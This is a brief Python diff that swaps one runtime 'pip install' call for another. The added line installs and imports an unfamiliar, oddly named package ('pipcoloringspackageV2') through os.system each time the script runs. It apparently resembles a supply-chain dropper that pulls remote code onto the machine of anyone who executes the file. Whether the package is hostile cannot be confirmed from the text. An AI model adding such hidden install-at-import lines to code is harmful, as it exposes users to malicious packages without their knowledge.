@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcolouringskitsV1")
-import pipcolouringskitsV1
+os.system("pip install pipcoloringspackageV2")
+import pipcoloringspackageV2
 import json
 import httpx
 import time
